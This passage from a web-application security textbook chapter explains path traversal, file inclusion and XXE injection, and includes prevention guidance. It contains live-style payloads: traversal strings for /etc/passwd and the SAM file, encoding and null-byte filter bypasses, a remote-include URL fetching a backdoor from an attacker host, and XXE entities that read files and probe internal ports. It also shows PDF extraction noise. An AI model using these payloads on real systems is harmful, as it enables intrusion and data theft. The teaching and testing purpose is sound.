as\nalphanumeric characters excluding whitespace.\nManipulating File Paths\nMany types of functionality commonly found in web applications involve pro-\ncessing user-supplied input as a fi le or directory name. Typically, the input is\npassed to an API that accepts a fi le path, such as in the retrieval of a fi le from the\nlocal fi lesystem. The application processes the result of the API call within its\nresponse to the user’s request. If the user-supplied input is improperly validated,\nthis behavior can lead to various security vulnerabilities, the most common of\nwhich are fi le path traversal bugs and fi le inclusion bugs.\nPath Traversal Vulnerabilities\nPath traversal vulnerabilities arise when the application uses user-controllable\ndata to access fi les and directories on the application server or another back-\nend fi lesystem in an unsafe way. By submitting crafted input, an attacker may\nbe able to cause arbitrary content to be read from, or written to, anywhere on\nthe fi lesystem being accessed. This often enables an attacker to read sensitive\ninformation from the server, or overwrite sensitive fi les, ultimately leading to\narbitrary command execution on the server.\ncc1100..iinndddd 336688 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 369\nChapter 10 n Attacking Back-End Components 369\nConsider the following example, in which an application uses a dynamic\npage to return static images to the client. The name of the requested image is\nspecifi ed in a query string parameter:\nhttp://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg\nWhen the server processes this request, it follows these steps:\n1. Extracts the value of the filename parameter from the query string.\n2. Appends this value to the prefi x C:\\filestore\\.\n3. Opens the fi le with this name.\n4. Reads the fi le’s contents and returns it to the client.\nThe vulnerability arises because an attacker can place path traversal sequences\ninto the fi lename to backtrack up from the directory specifi ed in step 2 and\ntherefore access fi les from anywhere on the server that the user context used by\nthe application has privileges to access. The path traversal sequence is known\nas “dot-dot-slash”; a typical attack looks like this:\nhttp://mdsec.net/filestore/8/GetFile.ashx?filename=..\\windows\\win.ini\nWhen the application appends the value of the filename parameter to the\nname of the images directory, it obtains the following path:\nC:\\filestore\\..\\windows\\win.ini\nThe two traversal sequences effectively step back up from the images direc-\ntory to the root of the C: drive, so the preceding path is equivalent to this:\nC:\\windows\\win.ini\nHence, instead of returning an image fi le, the server actually returns a default\nWindows confi guration fi le.\nNOTE In older versions of Windows IIS web server, applications would, by\ndefault, run with local system privileges, allowing access to any readable fi le\non the local fi lesystem. In more recent versions, in common with many other\nweb servers, the server’s process by default runs in a less privileged user\ncontext. For this reason, when probing for path traversal vulnerabilities, it is\nbest to request a default fi le that can be read by any type of user, such as\nc:\\windows\\win.ini.\nIn this simple example, the application implements no defenses to prevent\npath traversal attacks. However, because these attacks have been widely known\ncc1100..iinndddd 336699 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 370\n370 Chapter 10 n Attacking Back-End Components\nabout for some time, it is common to encounter applications that implement\nvarious defenses against them, often based on input validation fi lters. As\nyou will see, these fi lters are often poorly designed and can be bypassed by a\nskilled attacker.\nTRY IT!\nhttp://mdsec.net/filestore/8/\nFinding and Exploiting Path Traversal Vulnerabilities\nMany kinds of functionality require a web application to read from or write to\na fi lesystem on the basis of parameters supplied within user requests. If these\noperations are carried out in an unsafe manner, an attacker can submit crafted\ninput that causes the application to access fi les that the application designer\ndid not intend it to access. Known as pathtraversal vulnerabilities, such defects\nmay enable the attacker to read sensitive data including passwords and appli-\ncation logs, or to overwrite security-critical items such as confi guration fi les\nand software binaries. In the most serious cases, the vulnerability may enable\nan attacker to completely compromise both the application and the underlying\noperating system.\nPath traversal fl aws are sometimes subtle to detect, and many web applications\nimplement defenses against them that may be vulnerable to bypasses. We will\ndescribe all the various techniques you will need, from identifying potential\ntargets, to probing for vulnerable behavior, to circumventing the application’s\ndefenses, to dealing with custom encoding.\nLocating Targets for Attack\nDuring your initial mapping of the application, you should already have identifi ed\nany obvious areas of attack surface in relation to path traversal vulnerabilities.\nAny functionality whose explicit purpose is uploading or downloading fi les\nshould be thoroughly tested. This functionality is often found in work fl ow\napplications where users can share documents, in blogging and auction appli-\ncations where users can upload images, and in informational applications\nwhere users can retrieve documents such as ebooks, technical manuals, and\ncompany reports.\nIn addition to obvious target functionality of this kind, various other types\nof behavior may suggest relevant interaction with the fi lesystem.\ncc1100..iinndddd 337700 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 371\nChapter 10 n Attacking Back-End Components 371\n\nHACK STEPS\n1. Review the information gathered during application mapping to identify\nthe following:\nn Any instance where a request parameter appears to contain the name\nof a fi le or directory, such as include=main.inc or template=/en/\nsidebar.\nn Any application functions whose implementation is likely to involve\nretrieval of data from a server fi lesystem (as opposed to a back-end\ndatabase), such as the displaying of offi ce documents or images.\n2. During all testing you perform in relation to every other kind of vulner-\nability, look for error messages or other anomalous events that are\nof interest. Try to find any evidence of instances where user-supplied\ndata is being passed to file APIs or as parameters to operating system\ncommands.\nTIP If you have local access to the application (either in a whitebox testing exer-\ncise or because you have compromised the server’s operating system), identify-\ning targets for path traversal testing is usually straightforward, because you can\nmonitor all fi lesystem interaction that the application performs.\n\nHACK STEPS\nIf you have local access to the web application, do the following:\n1. Use a suitable tool to monitor all filesystem activity on the server. For\nexample, the FileMon tool from SysInternals can be used on the Windows\nplatform, the ltrace/strace tools can be used on Linux, and the truss\ncommand can be used on Sun’s Solaris.\n2. Test every page of the application by inserting a single unique string (such\nastraversaltest) into each submitted parameter (including all cookies,\nquery string fields, and POST data items). Target only one parameter at a\ntime, and use the automated techniques described in Chapter 14 to speed\nup the process.\n3. Set a filter in your filesystem monitoring tool to identify all filesystem\nevents that contain your test string.\n4. If any events are identified where your test string has been used as or\nincorporated into a file or directory name, test each instance (as described\nnext) to determine whether it is vulnerable to path traversal attacks.\ncc1100..iinndddd 337711 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 372\n372 Chapter 10 n Attacking Back-End Components\nDetecting Path Traversal Vulnerabilities\nHaving identifi ed the various potential targets for path traversal testing, you\nneed to test every instance individually to determine whether user-controllable\ndata is being passed to relevant fi lesystem operations in an unsafe manner.\nFor each user-supplied parameter being tested, determine whether traversal\nsequences are being blocked by the application or whether they work as expected.\nAn initial test that is usually reliable is to submit traversal sequences in a way\nthat does not involve stepping back above the starting directory.\n\nHACK STEPS\n1. Working on the assumption that the parameter you are targeting is being\nappended to a preset directory specified by the application, modify the\nparameter’s value to insert an arbitrary subdirectory and a single traversal\nsequence. For example, if the application submits this parameter:\nfile=foo/file1.txt\ntry submitting this value:\nfile=foo/bar/../file1.txt\nIf the application’s behavior is identical in the two cases, it may be vul-\nnerable. You should proceed directly to attempting to access a different\nfile by traversing above the start directory.\n2. If the application’s behavior is different in the two cases, it may be block-\ning, stripping, or sanitizing traversal sequences, resulting in an invalid file\npath. You should examine whether there are any ways to circumvent the\napplication’s validation filters (described in the next section).\nThe reason why this test is effective, even if the subdirectory “bar” does\nnot exist, is that most common filesystems perform canonicalization of\nthe file path before attempting to retrieve it. The traversal sequence can-\ncels out the invented directory, so the server does not check whether it is\npresent.\nIf you fi nd any instances where submitting traversal sequences without step-\nping above the starting directory does not affect the application’s behavior, the\nnext test is to attempt to traverse out of the starting directory and access fi les\nfrom elsewhere on the server fi lesystem.\ncc1100..iinndddd 337722 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 373\nChapter 10 n Attacking Back-End Components 373\n\nHACK STEPS\n1. If the application function you are attacking provides read access to a file,\nattempt to access a known world-readable file on the operating system in\nquestion. Submit one of the following values as the filename parameter\nyou control:\n../../../../../../../../../../../../etc/passwd\n../../../../../../../../../../../../windows/win.ini\nIf you are lucky, your browser displays the contents of the file you have\nrequested, as shown in Figure 10-5.\n2. If the function you are attacking provides write access to a file, it may be\nmore difficult to verify conclusively whether the application is vulnera-\nble. One test that is often effective is to attempt to write two files — one\nthat should be writable by any user, and one that should not be writable\neven by root or Administrator. For example, on Windows platforms you\ncan try this:\n../../../../../../../../../../../../writetest.txt\n../../../../../../../../../../../../windows/system32/config/sam\nOn UNIX-based platforms, files that root may not write are version-\ndependent, but attempting to overwrite a directory with a file should\nalways fail, so you can try this:\n../../../../../../../../../../../../tmp/writetest.txt\n../../../../../../../../../../../../tmp\nFor each pair of tests, if the application’s behavior is different in\nresponse to the first and second requests (for example, if the second\nreturns an error message but the first does not), the application probably\nis vulnerable.\n3. An alternative method for verifying a traversal flaw with write access is\nto try to write a new file within the web root of the web server and then\nattempt to retrieve this with a browser. However, this method may not\nwork if you do not know the location of the web root directory or if the\nuser context in which the file access occurs does not have permission to\nwrite there.\ncc1100..iinndddd 337733 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 374\n374 Chapter 10 n Attacking Back-End Components\nFigure 10-5: A successful path traversal attack\nNOTE Virtually all fi lesystems tolerate redundant traversal sequences that\nappear to try to move above the root of the fi lesystem. Hence, it is usually\nadvisable to submit a large number of traversal sequences when probing for\na fl aw, as in the examples given here. It is possible that the starting directory\nto which your data is appended lies deep within the fi lesystem, so using an\nexcessive number of sequences helps avoid false negatives.\nAlso, the Windows platform tolerates both forward slashes and backslashes\nas directory separators, whereas UNIX-based platforms tolerate only the for-\nward slash. Furthermore, some web applications fi lter one version but not\nthe other. Even if you are certain that the web server is running a UNIX-based\noperating system, the application may still be calling out to a Windows-based\nback-end component. Because of this, it is always advisable to try both ver-\nsions when probing for traversal fl aws.\nCircumventing Obstacles to Traversal Attacks\nIf your initial attempts to perform a traversal attack (as just described) are\nunsuccessful, this does not mean that the application is not vulnerable. Many\napplication developers are aware of path traversal vulnerabilities and implement\nvarious kinds of input validation checks in an attempt to prevent them. However,\nthose defenses are often fl awed and can be bypassed by a skilled attacker.\nThe fi rst type of input fi lter commonly encountered involves checking whether\nthe fi lename parameter contains any path traversal sequences. If it does, the\nfi lter either rejects the request or attempts to sanitize the input to remove the\nsequences. This type of fi lter is often vulnerable to various attacks that use alter-\nnative encodings and other tricks to defeat the fi lter. These attacks all exploit\nthe type of canonicalization problems faced by input validation mechanisms,\nas described in Chapter 2.\ncc1100..iinndddd 337744 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 375\nChapter 10 n Attacking Back-End Components 375\n\nHACK STEPS\n1. Always try path traversal sequences using both forward slashes and back-\nslashes. Many input filters check for only one of these, when the filesys-\ntem may support both.\n2. Try simple URL-encoded representations of traversal sequences using the\nfollowing encodings. Be sure to encode every single slash and dot within\nyour input:\nn Dot — %2e\nn Forward slash — %2f\nn Backslash — %5c\n3. Try using 16-bit Unicode encoding:\nn Dot — %u002e\nn Forward slash — %u2215\nn Backslash — %u2216\n4. Try double URL encoding:\nn Dot — %252e\nn Forward slash — %252f\nn Backslash — %255c\n5. Try overlong UTF-8 Unicode encoding:\nn Dot — %c0%2e,%e0%40%ae,%c0ae, and so on\nn Forward slash — %c0%af,%e0%80%af,%c0%2f, and so on\nn Backslash — %c0%5c,%c0%80%5c, and so on\nYou can use the illegal Unicode payload type within Burp Intruder to\ngenerate a huge number of alternate representations of any given char-\nacter and submit this at the relevant place within your target parameter.\nThese representations strictly violate the rules for Unicode representa-\ntion but nevertheless are accepted by many implementations of Unicode\ndecoders, particularly on the Windows platform.\n6. If the application is attempting to sanitize user input by removing tra-\nversal sequences and does not apply this filter recursively, it may be\npossible to bypass the filter by placing one sequence within another. For\nexample:\n....//\n....\\/\n..../\\\n....\\\\\ncc1100..iinndddd 337755 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 376\n376 Chapter 10 n Attacking Back-End Components\nTRY IT!\nhttp://mdsec.net/filestore/30/\nhttp://mdsec.net/filestore/39/\nhttp://mdsec.net/filestore/46/\nhttp://mdsec.net/filestore/59/\nhttp://mdsec.net/filestore/65/\nThe second type of input fi lter commonly encountered in defenses against path\ntraversal attacks involves verifying whether the user-supplied fi lename contains\na suffi x (fi le type) or prefi x (starting directory) that the application expects. This\ntype of defense may be used in tandem with the fi lters already described.\n\nHACK STEPS\n1. Some applications check whether the user-supplied filename ends in\na particular file type or set of file types and reject attempts to access\nanything else. Sometimes this check can be subverted by placing a URL-\nencoded null byte at the end of your requested filename, followed by a\nfile type that the application accepts. For example:\n../../../../../boot.ini%00.jpg\nThe reason this attack sometimes succeeds is that the file type check\nis implemented using an API in a managed execution environment in\nwhich strings are permitted to contain null characters (such as String.\nendsWith() in Java). However, when the file is actually retrieved, the\napplication ultimately uses an API in an unmanaged environment in which\nstrings are null-terminated. Therefore, your filename is effectively trun-\ncated to your desired value.\n2. Some applications attempt to control the file type being accessed by\nappending their own file-type suffix to the filename supplied by the user.\nIn this situation, either of the preceding exploits may be effective, for the\nsame reasons.\n3. Some applications check whether the user-supplied filename starts with\na particular subdirectory of the start directory, or even a specific filename.\nThis check can, of course, be bypassed easily as follows:\nfilestore/../../../../../../../etc/passwd\n4. If none of the preceding attacks against input filters is successful indi-\nvidually, the application might be implementing multiple types of filters.\nTherefore, you need to combine several of these attacks simultaneously\n(both against traversal sequence filters and file type or directory filters). If\ncc1100..iinndddd 337766 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 377\nChapter 10 n Attacking Back-End Components 377\n\nHACK STEPS\npossible, the best approach here is to try to break the problem into sepa-\nrate stages. For example, if the request for:\ndiagram1.jpg\nis successful, but the request for:\nfoo/../diagram1.jpg\nfails, try all the possible traversal sequence bypasses until a variation on\nthe second request is successful. If these successful traversal sequence\nbypasses don’t enable you to access /etc/passwd, probe whether any\nfile type filtering is implemented and can be bypassed by requesting:\ndiagram1.jpg%00.jpg\nWorking entirely within the start directory defined by the application,\ntry to probe to understand all the filters being implemented, and see\nwhether each can be bypassed individually with the techniques described.\n5. Of course, if you have whitebox access to the application, your task is\nmuch easier, because you can systematically work through different types\nof input and verify conclusively what filename (if any) is actually reaching\nthe filesystem.\nCoping with Custom Encoding\nProbably the craziest path traversal bug that the authors have encountered\ninvolved a custom encoding scheme for fi lenames that were ultimately handled\nin an unsafe way. It demonstrated how obfuscation is no substitute for security.\nThe application contained some work fl ow functionality that enabled users\nto upload and download fi les. The request performing the upload supplied a\nfi lename parameter that was vulnerable to a path traversal attack when writing\nthe fi le. When a fi le had been successfully uploaded, the application provided\nusers with a URL to download it again. There were two important caveats:\nn The application verifi ed whether the fi le to be written already existed. If\nit did, the application refused to overwrite it.\nn The URLs generated for downloading users’ fi les were represented using\na proprietary obfuscation scheme. This appeared to be a customized form\nof Base64 encoding in which a different character set was employed at\neach position of the encoded fi lename.\nTaken together, these caveats presented a barrier to straightforward exploita-\ntion of the vulnerability. First, although it was possible to write arbitrary fi les to\ncc1100..iinndddd 337777 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 378\n378 Chapter 10 n Attacking Back-End Components\nthe server fi lesystem, it was not possible to overwrite any existing fi le. Also, the\nlow privileges of the web server process meant that it was not possible to create\na new fi le in any interesting locations. Second, it was not possible to request\nan arbitrary existing fi le (such as /etc/passwd) without reverse engineering\nthe custom encoding, which presented a lengthy and unappealing challenge.\nA little experimentation revealed that the obfuscated URLs contained the\noriginal fi lename string supplied by the user. For example:\nn test.txt became zM1YTU4NTY2Y\nn foo/../test.txt became E1NzUyMzE0ZjQ0NjMzND\nThe difference in length of the encoded URLs indicated that no path canoni-\ncalization was performed before the encoding was applied. This behavior gave\nus enough of a toehold to exploit the vulnerability. The fi rst step was to submit\na fi le with the following name:\n../../../../../.././etc/passwd/../../tmp/foo\nwhich, in its canonical form, is equivalent to:\n/tmp/foo\nTherefore, it could be written by the web server. Uploading this fi le produced\na download URL containing the following obfuscated fi lename:\nFhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrMHdUbXBWZWs1NldYaE5lb\nTo modify this value to return the fi le /etc/passwd, we simply needed to\ntruncate it at the right point, which was:\nFhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrM\nAttempting to download a fi le using this value returned the server’s passwd\nfi le as expected. The server had given us suffi cient resources to be able to encode\narbitrary fi le paths using its scheme, without even deciphering the obfuscation\nalgorithm being used!\nNOTE You may have noticed the appearance of a redundant ./ in the name\nof our uploaded fi le. This was necessary to ensure that our truncated URL\nended on a 3-byte boundary of cleartext, and therefore on a 4-byte bound-\nary of encoded text, in line with the Base64 encoding scheme. Truncating an\nencoded URL partway through an encoded block would almost certainly cause\nan error when decoded on the server.\ncc1100..iinndddd 337788 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 379\nChapter 10 n Attacking Back-End Components 379\nExploiting Traversal Vulnerabilities\nHaving identifi ed a path traversal vulnerability that provides read or write\naccess to arbitrary fi les on the server’s fi lesystem, what kind of attacks can you\ncarry out by exploiting these? In most cases, you will fi nd that you have the\nsame level of read/write access to the fi lesystem as the web server process does.\n\nHACK STEPS\nYou can exploit read access path traversal fl aws to retrieve interesting fi les\nfrom the server that may contain directly useful information or that help you\nrefi ne attacks against other vulnerabilities. For example:\nn Password fi les for the operating system and application\nn Server and application confi guration fi les to discover other vulnerabilities\nor fi ne-tune a different attack\nn Include fi les that may contain database credentials\nn Data sources used by the application, such as MySQL database fi les or\nXML fi les\nn The source code to server-executable pages to perform a code review in\nsearch of bugs (for example, GetImage.aspx?file=GetImage.aspx)\nn Application log fi les that may contain usernames and session tokens and\nthe like\nIf you fi nd a path traversal vulnerability that grants write access, your main\ngoal should be to exploit this to achieve arbitrary execution of commands on\nthe server. Here are some ways to exploit this vulnerability:\nn Create scripts in users’ startup folders.\nn Modify fi les such as in.ftpd to execute arbitrary commands when a\nuser next connects.\nn Write scripts to a web directory with execute permissions, and call them\nfrom your browser.\nPreventing Path Traversal Vulnerabilities\nBy far the most effective means of eliminating path traversal vulnerabilities is to\navoid passing user-submitted data to any fi lesystem API. In many cases, includ-\ning the original example GetFile.ashx?filename=keira.jpg, it is unnecessary\nfor an application to do this. Most fi les that are not subject to any access control\ncan simply be placed within the web root and accessed via a direct URL. If this\ncc1100..iinndddd 337799 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 380\n380 Chapter 10 n Attacking Back-End Components\nis not possible, the application can maintain a hard-coded list of image fi les that\nmay be served by the page. It can use a different identifi er to specify which\nfi le is required, such as an index number. Any request containing an invalid\nidentifi er can be rejected, and there is no attack surface for users to manipulate\nthe path of fi les delivered by the page.\nIn some cases, as with the work fl ow functionality that allows fi le uploading\nand downloading, it may be desirable to allow users to specify fi les by name.\nDevelopers may decide that the easiest way to implement this is by passing\nthe user-supplied fi lename to fi lesystem APIs. In this situation, the application\nshould take a defense-in-depth approach to place several obstacles in the way\nof a path traversal attack.\nHere are some examples of defenses that may be used; ideally, as many of\nthese as possible should be implemented together:\nn After performing all relevant decoding and canonicalization of the user-\nsubmitted fi lename, the application should check whether it contains either\nof the path traversal sequences (using backslashes or forward slashes) or\nany null bytes. If so, the application should stop processing the request. It\nshould not attempt to perform any sanitization on the malicious fi lename.\nn The application should use a hard-coded list of permissible fi le types and\nreject any request for a different type (after the preceding decoding and\ncanonicalization have been performed).\nn After performing all its fi ltering on the user-supplied fi lename, the appli-\ncation should use suitable fi lesystem APIs to verify that nothing is amiss\nand that the fi le to be accessed using that fi lename is located in the start\ndirectory specifi ed by the application.\nIn Java, this can be achieved by instantiating a java.io.File object using\nthe user-supplied fi lename and then calling the getCanonicalPath method\non this object. If the string returned by this method does not begin with the\nname of the start directory, the user has somehow bypassed the applica-\ntion’s input fi lters, and the request should be rejected.\nIn ASP.NET, this can be achieved by passing the user-supplied fi lename\nto the System.Io.Path.GetFullPath method and checking the returned\nstring in the same way as described for Java.\nThe application can mitigate the impact of most exploitable path traversal\nvulnerabilities by using a chrooted environment to access the directory contain-\ning the fi les to be accessed. In this situation, the chrooted directory is treated as\ncc1100..iinndddd 338800 88//1199//22001111 1122::1100::4488 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 381\nChapter 10 n Attacking Back-End Components 381\nif it is the fi lesystem root, and any redundant traversal sequences that attempt\nto step up above it are ignored. Chrooted fi lesystems are supported natively\non most UNIX-based platforms. A similar effect can be achieved on Windows\nplatforms (in relation to traversal vulnerabilities, at least) by mounting the\nrelevant start directory as a new logical drive and using the associated drive\nletter to access its contents.\nThe application should integrate its defenses against path traversal attacks\nwith its logging and alerting mechanisms. Whenever a request is received that\ncontains path traversal sequences, this indicates likely malicious intent on the\nuser’s part. The application should log the request as an attempted security\nbreach, terminate the user’s session, and, if applicable, suspend the user’s account\nand generate an alert to an administrator.\nFile Inclusion Vulnerabilities\nMany scripting languages support the use of include fi les. This facility enables\ndevelopers to place reusable code components into separate fi les and to include\nthese within function-specifi c code fi les as and when they are needed. The code\nwithin the included fi le is interpreted just as if it had been inserted at the loca-\ntion of the include directive.\nRemote File Inclusion\nThe PHP language is particularly susceptible to fi le inclusion vulnerabilities\nbecause its include functions can accept a remote fi le path. This has been the\nbasis of numerous vulnerabilities in PHP applications.\nConsider an application that delivers different content to people in different\nlocations. When users choose their location, this is communicated to the server\nvia a request parameter, as follows:\nhttps://wahh-app.com/main.php?Country=US\nThe application processes the Country parameter as follows:\n$country = $_GET[‘Country’];\ninclude( $country . ‘.php’ );\nThis causes the execution environment to load the fi le US.php that is located\non the web server fi lesystem. The contents of this fi le are effectively copied into\nthe main.php fi le and executed.\ncc1100..iinndddd 338811 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 382\n382 Chapter 10 n Attacking Back-End Components\nAn attacker can exploit this behavior in different ways, the most serious of\nwhich is to specify an external URL as the location of the include fi le. The PHP\ninclude function accepts this as input, and the execution environment retrieves\nthe specifi ed fi le and executes its contents. Hence, an attacker can construct\na malicious script containing arbitrarily complex content, host this on a web\nserver he controls, and invoke it for execution via the vulnerable application\nfunction. For example:\nhttps://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor\nLocal File Inclusion\nIn some cases, include fi les are loaded on the basis of user-controllable data, but\nit is not possible to specify a URL to a fi le on an external server. For example,\nif user-controllable data is passed to the ASP function Server.Execute, an\nattacker may be able to cause an arbitrary ASP script to be executed, provided\nthat this script belongs to the same application as the one that is calling the\nfunction.\nIn this situation, you may still be able to exploit the application’s behavior to\nperform unauthorized actions:\nn There may be server-executable fi les on the server that you cannot access\nthrough the normal route. For example, any requests to the path /admin\nmay be blocked through application-wide access controls. If you can cause\nsensitive functionality to be included into a page that you are authorized\nto access, you may be able to gain access to that functionality.\nn There may be static resources on the server that are similarly protected\nfrom direct access. If you can cause these to be dynamically included\ninto other application pages, the execution environment typically simply\ncopies the contents of the static resource into its response.\nFinding File Inclusion Vulnerabilities\nFile inclusion vulnerabilities may arise in relation to any item of user-supplied\ndata. They are particularly common in request parameters that specify a lan-\nguage or location. They also often arise when the name of a server-side fi le is\npassed explicitly as a parameter.\ncc1100..iinndddd 338822 88//1199//22001111 1122::1100::4488 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 383\nChapter 10 n Attacking Back-End Components 383\n\nHACK STEPS\nTo test for remote fi le inclusion fl aws, follow these steps:\n1. Submit in each targeted parameter a URL for a resource on a web server\nthat you control, and determine whether any requests are received from\nthe server hosting the target application.\n2. If the first test fails, try submitting a URL containing a nonexistent IP\naddress, and determine whether a timeout occurs while the server\nattempts to connect.\n3. If the application is found to be vulnerable to remote file inclusion, con-\nstruct a malicious script using the available APIs in the relevant language,\nas described for dynamic execution attacks.\nLocal fi le inclusion vulnerabilities can potentially exist in a much wider\nrange of scripting environments than those that support remote fi le inclu-\nsion. To test for local fi le inclusion vulnerabilities, follow these steps:\n1. Submit the name of a known executable resource on the server, and\ndetermine whether any change occurs in the application’s behavior.\n2. Submit the name of a known static resource on the server, and determine\nwhether its contents are copied into the application’s response.\n3. If the application is vulnerable to local file inclusion, attempt to access\nany sensitive functionality or resources that you cannot reach directly via\nthe web server.\n4. Test to see if you can access files in other directories using the traversal\ntechniques described previously.\nInjecting into XML Interpreters\nXML is used extensively in today’s web applications, both in requests and\nresponses between the browser and front-end application server and in mes-\nsages between back-end application components such as SOAP services. Both\nof these locations are susceptible to attacks whereby crafted input is used to\ninterfere with the operation of the application and normally perform some\nunauthorized action.\ncc1100..iinndddd 338833 88//1199//22001111 1122::1100::4488 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 384\n384 Chapter 10 n Attacking Back-End Components\nInjecting XML External Entities\nIn today’s web applications, XML is often used to submit data from the client\nto the server. The server-side application then acts on this data and may return\na response containing XML or data in any other format. This behavior is most\ncommonly found in Ajax-based applications where asynchronous requests are\nused to communicate in the background. It can also appear in the context of\nbrowser extension components and other client-side technologies.\nFor example, consider a search function that, to provide a seamless user\nexperience, is implemented using Ajax. When a user enters a search term, a\nclient-side script issues the following request to the server:\nPOST /search/128/AjaxSearch.ashx HTTP/1.1\nHost: mdsec.net\nContent-Type: text/xml; charset=UTF-8\nContent-Length: 44\n<Search><SearchTerm>nothing will change</SearchTerm></Search>\nThe server’s response is as follows (although vulnerabilities may exist regard-\nless of the format used in responses):\nHTTP/1.1 200 OK\nContent-Type: text/xml; charset=utf-8\nContent-Length: 81\n<Search><SearchResult>No results found for expression: nothing will\nchange</SearchResult></Search>\nThe client-side script processes this response and updates part of the user\ninterface with the results of the search.\nWhen you encounter this type of functionality, you should always check for\nXML external entity (XXE) injection. This vulnerability arises because standard\nXML parsing libraries support the use of entity references. These are simply a\nmethod of referencing data either inside or outside the XML document. Entity\nreferences should be familiar from other contexts. For example, the entities\ncorresponding to the < and > characters are as follows:\n&lt;\n&gt;\nThe XML format allows custom entities to be defi ned within the XML docu-\nment itself. This is done within the optional DOCTYPE element at the start of the\ndocument. For example:\n<!DOCTYPE foo [ <!ENTITY testref “testrefvalue” > ]>\ncc1100..iinndddd 338844 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 385\nChapter 10 n Attacking Back-End Components 385\nIf a document contains this defi nition, the parser replaces any occurrences\nof the &testref; entity reference within the document with the defi ned value,\ntestrefvalue.\nFurthermore, the XML specifi cation allows entities to be defi ned using exter-\nnal references, the value of which is fetched dynamically by the XML parser.\nThese external entity defi nitions use the URL format and can refer to external\nweb URLs or resources on the local fi lesystem. The XML parser fetches the\ncontents of the specifi ed URL or fi le and uses this as the value of the defi ned\nentity. If the application returns in its response any parts of the XML data that\nuse an externally defi ned entity, the contents of the specifi ed fi le or URL are\nreturned in the response.\nExternal entities can be specifi ed within the attacker’s XML-based request\nby adding a suitable DOCTYPE element to the XML (or by modifying the element\nif it already exists). An external entity reference is specifi ed using the SYSTEM\nkeyword, and its defi nition is a URL that may use the file: protocol.\nIn the preceding example, the attacker can submit the following request, which\ndefi nes an XML external entity that references a fi le on the server’s fi lesystem:\nPOST /search/128/AjaxSearch.ashx HTTP/1.1\nHost: mdsec.net\nContent-Type: text/xml; charset=UTF-8\nContent-Length: 115\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///windows/win.ini” > ]>\n<Search><SearchTerm>&xxe;</SearchTerm></Search>\nThis causes the XML parser to fetch the contents of the specifi ed fi le and to\nuse this in place of the defi ned entity reference, which the attacker has used\nwithin the SearchTerm element. Because the value of this element is echoed in\nthe application’s response, this causes the server to respond with the contents\nof the fi le, as follows:\nHTTP/1.1 200 OK\nContent-Type: text/xml; charset=utf-8\nContent-Length: 556\n<Search><SearchResult>No results found for expression: ; for 16-bit app\nsupport\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n...\nTRY IT!\nhttp://mdsec.net/search/128/\ncc1100..iinndddd 338855 88//1199//22001111 1122::1100::4488 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 386\n386 Chapter 10 n Attacking Back-End Components\nIn addition to using the file: protocol to specify resources on the local\nfi lesystem, the attacker can use protocols such as http: to cause the server to\nfetch resources across the network. These URLs can specify arbitrary hosts,\nIP addresses, and ports. They may allow the attacker to interact with network\nservices on back-end systems that cannot be directly reached from the Internet.\nFor example, the following attack attempts to connect to a mail server running\non port 25 on the private IP address 192.168.1.1:\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://192.168.1.1:25” > ]>\n<Search><SearchTerm>&xxe;</SearchTerm></Search>\nThis technique may allow various attacks to be performed:\nn The attacker can use the application as a proxy, retrieving sensitive content\nfrom any web servers that the application can reach, including those running\ninternally within the organization on private, nonroutable address space.\nn The attacker can exploit vulnerabilities on back-end web applications,\nprovided that these can be exploited via the URL.\nn The attacker can test for open ports on back-end systems by cycling through\nlarge numbers of IP addresses and port numbers. In some cases, timing\ndifferences can be used to infer the state of a requested port. In other\ncases, the service banners from some services may actually be returned\nwithin the application’s responses.\nFinally, if the application retrieves the external entity but does not return this\nin responses, it may still be possible to cause a denial of service by reading a\nfi le stream indefi nitely. For example:\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “ file:///dev/random”> ]>\nInjecting into SOAP Services\nSimple Object Access Protocol (SOAP) is a message-based communications\ntechnology that uses the XML format to encapsulate data. It can be used to\nshare information and transmit messages between systems, even if these run\non different operating systems and architectures. Its primary use is in web\nservices. In the context of a browser-accessed web application, you are most\nlikely to encounter SOAP in the communications that occur between back-end\napplication components.\nSOAP is often used in large-scale enterprise applications where individual tasks\nare performed by different computers to improve performance. It is also often\nfound where a web application has been deployed as a front end to an existing\napplication. In this situation, communications between different components\nmay be implemented using SOAP to ensure modularity and interoperability.\ncc1100..iinndddd 338866 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 387\nChapter 10 n Attacking Back-End Components 387\nBecause XML is an interpreted language, SOAP is potentially vulnerable to\ncode injection in a similar way as the other examples already described. XML\nelements are represented syntactically, using the metacharacters <,>, and /. If\nuser-supplied data containing these characters is inserted directly into a SOAP\nmessage, an attacker may be able to interfere with the message’s 